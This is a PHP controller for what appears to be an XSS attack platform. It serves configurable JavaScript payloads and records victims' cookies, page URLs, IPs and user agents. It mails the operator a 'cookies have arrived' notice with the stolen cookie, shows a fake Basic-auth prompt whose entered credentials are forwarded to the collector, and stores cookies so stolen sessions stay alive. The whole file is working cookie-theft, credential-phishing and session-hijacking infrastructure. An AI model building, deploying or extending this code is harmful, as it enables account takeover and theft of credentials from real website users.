<?php

namespace app\index\controller;

use think\Controller;
use think\Request;
use think\Validate;

class Project extends Common
{
    public function index()
    {
        $id = input('param.id');
        $project = model('Project')->where('id',$id)->where('user_id',session('userid'))->find();
        if(!$project){
            $this->error('项目不存在或没有权限','index/user/index');
        }
        $project_contents = model('ProjectContent')->where('project_id',$id)->order('update_time','desc')->paginate(10);
        $this->assign('project',$project);
        $this->assign('project_contents',$project_contents);
        $this->assign('title','项目内容'.'-'.config('siteconfig.title'));
        return $this->fetch();
    }

    public function create()
    {
        $this->assign('title','创建项目'.'-'.config('siteconfig.title'));
        return $this->fetch();
    }

    public function saveCreate()
    {
        $validate = Validate::make([
            'title|项目名称'  => 'require|max:30|token',
        ]);
        if (!$validate->check($this->request->post())) {
            $this->error($validate->getError());
        }

        $data['title'] = input('post.title');
        $data['description'] = input('post.description');
        $data['modules'] = json_encode([]);
        $data['moduleSetKeys'] = json_encode([]);
        $urlkey_list = model('Project')->column('urlkey');
        $data['urlkey'] = model('Project')->makeUrlkey($urlkey_list);
        $data['user_id'] = session('userid');
        $data['add_time'] = time();

        $result = \app\index\model\Project::create($data);
        if($result){
            $this->redirect('index/project/setcode',['id'=>$result['id']]);
        }else{
            $this->error('项目创建失败！');
        }
    }

    public function setCode()
    {
        $id = input('param.id');
        $user_id = session('userid');
        $project = model('Project')->where('id',$id)->where('user_id',$user_id)->find();
        if(!$project){
            $this->error('项目不存在或没有权限');
        }
        $modules = model('Module')->select();
        $moduleSetKeys = (array)json_decode($project['moduleSetKeys']);

        $this->assign('project',$project);
        $this->assign('modules',$modules);
        $this->assign('moduleSetKeys',$moduleSetKeys);
        $this->assign('title','配置代码'.'-'.config('siteconfig.title'));
        return $this->fetch();
    }

    public function saveSetCode()
    {
        $validate = Validate::make([
            '__token__'  => 'require|token',
        ]);
        if (!$validate->check($this->request->post())) {
            $this->error($validate->getError());
        }
        $moduleSetKeys = [];

        $modules = input('post.modules');
        if($modules){
            foreach ($modules as $mid){
                $module = model('Module')->where('id',$mid)->find();
                foreach ((array)json_decode($module['setkeys']) as $setkey){
                    $moduleSetKeys['setkey_'.$mid.'_'.$setkey] = urlencode(input('post.'.'setkey_'.$mid.'_'.$setkey));
                }
            }
        }else{
            $moduleSetKeys = [];
            $modules = [];
        }

        $id = input('post.id');
        $user_id = session('userid');
        $data['code'] = input('post.code');
        $data['moduleSetKeys'] = json_encode($moduleSetKeys);
        $data['modules'] = json_encode($modules);

        $project = model('Project')->get(['id'=>$id,'user_id'=>$user_id]);
        if(!$project){
            $this->error('项目不存在或没有权限');
        }

        $result = $project->force()->save($data);
        if($result){
            $this->success('配置成功','index/user/index');
        }else{
            $this->error('配置失败');
        }
    }

    public function viewCode()
    {
        $id = input('param.id');
        $user_id = session('userid');
        $project = model('Project')->where('id',$id)->where('user_id',$user_id)->find();
        if(!$project){
            $this->error('项目不存在或没有权限');
        }
        $this->assign('project',$project);
        $this->assign('title','项目代码'.'-'.config('siteconfig.title'));
        return $this->fetch();
    }

    public function delete()
    {
        $validate = Validate::make([
            'id'  => 'require|integer',
            '__token__' => 'require|token',
        ]);
        if (!$validate->check(input('get.'))) {
            $this->error($validate->getError());
        }
        $id = input('get.id');
        $user_id = session('userid');
        $project = model('Project')->where('id',$id)->where('user_id',$user_id)->find();
        if(!$project){
            $this->error('项目不存在或没有权限');
        }
        model('ProjectContent')->where('project_id',$project['id'])->delete();
        $result = model('Project')->where('id',$id)->delete();
        if($result){
            $this->success('删除成功');
        }else{
            $this->error('删除失败');
        }
    }

    public function code($urlkey)
    {
        $echo_code = '';
        $project = model('Project')->where('urlkey',$urlkey)->find();
        if(!$project){
            exit();
        }
        $moduleSetKeys = json_decode($project['moduleSetKeys'],true);
        $moduleIds = [];
        if(!empty($project['modules'])){
            $moduleIds = json_decode($project['modules']);
        }
        if(!empty($moduleIds)){
            $modulesStr = implode(',',$moduleIds);
            $modules = model('Module')->where('id','in',$modulesStr)->select();
            if($modules){
                foreach ($modules as $module){
                    $code = str_replace('{projectId}',$project['urlkey'],$module['code']);
                    $code = str_replace('{xssurl}',config('siteconfig.url'),$code);
                    if(!empty(json_decode($module['setkeys']))){
                        $setkeys = json_decode($module['setkeys']);
                        foreach ($setkeys as $setkey){
                            $code = str_replace('{set.'.$setkey.'}',urldecode($moduleSetKeys['setkey_'.$module['id'].'_'.$setkey]),$code);
                        }

                    }
                    $echo_code .= htmlspecialchars_decode($code,true);
                }
            }
        }
        $echo_code .=  htmlspecialchars_decode($project['code'],true);
        return response($echo_code)->header([
            'Content-type' => 'application/x-javascript',
            'Cache-Control' => 'nocache',
            'Pragma' => 'no-cache',
        ]);
    }

    public function api()
    {
        $urlkey = input('get.id');
        if($urlkey){
            $project = model('Project')->where('urlkey',$urlkey)->find();
            if(!$project) exit();
            $content = [];
            $keys = [];
            if(!empty($project['modules'])){
                $modulIds = json_decode($project['modules']);
            }
            if(!empty($modulIds)){
                $modulesStr = implode(',',$modulIds);
                $modules = model('Module')->where('id','in',$modulesStr)->select();
                if($modules){
                    foreach ($modules as $module){
                        if(!empty($module['keys'])){
                            $keys = array_merge($keys,json_decode($module['keys']));
                        }
                    }
                }
            }
            foreach ($keys as $key){
                $content[$key] = input('param.'.$key);
            }

            $location = in_array('location',$keys)?$content['location']:'';
            if(in_array('toplocation',$keys)){
                $content['toplocation'] = !empty($content['toplocation'])?$content['toplocation']:$location;
                $toplocation = $content['toplocation'];
            }else{
                $toplocation = '';
            }
            //过滤黑名单URL
            $sys_urlblacks = model('Urlblack')->where('user_id',0)->select();
            if($sys_urlblacks){
                foreach ($sys_urlblacks as $sys_urlblack){
                    if(strstr($toplocation,$sys_urlblack['url'])){
                        exit();
                    }
                }
            }
            $user_urlblacks = model('Urlblack')->where('user_id',$project['user_id'])->where('project_id',$project['id'])->select();
            if($user_urlblacks){
                foreach ($user_urlblacks as $user_urlblack){
                    if(strstr($toplocation,$user_urlblack['url'])){
                        exit();
                    }
                }
            }

            $cookie = in_array('cookie',$keys)?$content['cookie']:'';

            $judgeCookie = in_array('cookie',$keys)?true:false;
            $cookieHash = md5($project['id'].'_'.$cookie.'_'.$location.'_'.$toplocation);
            $cookieExisted = model('ProjectContent')->where('project_id',$project['id'])->where('cookieHash',$cookieHash)->count();
            if(!$judgeCookie || $cookieExisted <= 0){
                //服务器获取的content
                $serverContent = [];
                $serverContent['HTTP_REFERER'] = input('server.HTTP_REFERER');
                $referers = parse_url($serverContent['HTTP_REFERER']);
                $domain = $referers['host']?$referers['host']:'';
                $serverContent['HTTP_USER_AGENT'] = input('server.HTTP_USER_AGENT');
                $user_ip = get_ip();
                $serverContent['REMOTE_ADDR'] = $user_ip;
                $serverContent['IP-ADDR'] = urlencode(adders($user_ip));

                $data = [
                    'project_id' => $project['id'],
                    'content' => json_encode($content),
                    'serverContent' => json_encode($serverContent),
                    'domain' => $domain,
                    'cookieHash' => $cookieHash,
                    'add_time' => time(),
                    'update_time' => time(),
                ];
                model('ProjectContent')->save($data);
                //邮件提醒
                $user_id = $project['user_id'];
                $user = model('User')->where('id',$user_id)->find();
                if(config('siteconfig.is_sendemail')==1 && $user['sendemail']==1){
                    $email = model('Email')->randEmail();
                    if($email){
                        $url = config('siteconfig.url');
                        $option = [
                            'host' => $email['ehost'],
                            'sendemail' => $email['euser'],
                            'password' => $email['epass'],
                            'useremail' => $user['email'],
                            'username' => $user['username'],
                            'content' => "尊敬的：{$user['username']}，您在<a href='{$url}'>{$url}</a>预定的猫饼干<br>Cookie:{$cookie}<br>已经到货！<br>详情请登陆：<a href='{$url}'>{$url}</a>查看。",
                        ];
                        sendEmail($option);
                    }
                }
            }else{
                $data = [
                    'update_time' => time(),
                ];
                model('ProjectContent')->save($data,['project_id'=>$project['id'],'cookieHash'=>$cookieHash]);
            }
        }
        $this->redirect($_SERVER['HTTP_REFERER']);
    }

    public function authtest()
    {
        if(!input('?server.PHP_AUTH_USER') || !input('?server.PHP_AUTH_PW')){
            return response('Authorization Required.')->code(401)->header([
                'WWW-Authenticate' => 'Basic realm="'.input('get.info','','trim,addslashes').'"',
            ]);
        }else if(input('?server.PHP_AUTH_USER') && input('?server.PHP_AUTH_PW')){
            $url = url('index/project/api').'?id='.input('get.id').'&username='.input('server.PHP_AUTH_USER').'&password='.input('server.PHP_AUTH_PW');
            $this->redirect($url);
        }
    }

    public function keepsession()
    {
        $urlkey = input('get.id');
        $url = input('get.url');
        $cookie = input('get.cookie');

        $project = model('Project')->where('urlkey',$urlkey)->find();
        if($project && !empty($urlkey) && !empty($cookie)){
            $hash = md5($url.$cookie);
            $existed = model('Keepsession')->where('hash',$hash)->count();
            if($existed <= 0){
                $sum = model('Keepsession')->where('user_id',$project['user_id'])->count();
                if($sum < 10){
                    $data = [
                        'project_id' => $project['id'],
                        'user_id' => $project['user_id'],
                        'url' => $url,
                        'cookie' => $cookie,
                        'hash' => $hash,
                        'add_time' => time(),
                        'update_time' => time(),
                    ];
                    model('Keepsession')->save($data);
                }
            }
        }
    }
}
